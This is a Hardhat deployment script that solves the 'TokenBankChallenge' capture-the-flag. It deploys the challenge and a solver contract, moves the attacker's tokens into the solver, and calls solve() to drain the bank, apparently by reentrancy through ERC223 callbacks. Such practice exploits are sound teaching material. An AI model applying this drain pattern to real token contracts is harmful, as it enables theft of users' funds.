import { ethers } from "hardhat";

async function main() {
  const [owner, theif] = await ethers.getSigners();

  const ATTACKER_INITIAL_BALANCE = ethers.parseEther(`500000`);

  // deploy challenge contract
  const contractFactory = await ethers.getContractFactory("TokenBankChallenge");
  const contract = await contractFactory.deploy(theif.address);
  await contract.waitForDeployment();

  // deploy solver contract
  const solveFactory = await ethers.getContractFactory("TokenBankSolver");
  const solver = await solveFactory.deploy(contract.target);
  await solver.waitForDeployment();

  // implement token
  const tokenAddress = await contract.token();
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  const token: any = tokenFactory.attach(tokenAddress);

  let tx = await contract.withdraw(ATTACKER_INITIAL_BALANCE);
  await tx.wait();

  tx = await token[`transfer(address,uint256)`](
    solver.target,
    ATTACKER_INITIAL_BALANCE
  );
  await tx.wait();

  tx = await solver.deposit();
  await tx.wait();

  const attackerBalance = await contract.balanceOf(solver.target);
  console.log(`attackerBalance`, attackerBalance.toString());

  tx = await solver.solve();
  await tx.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
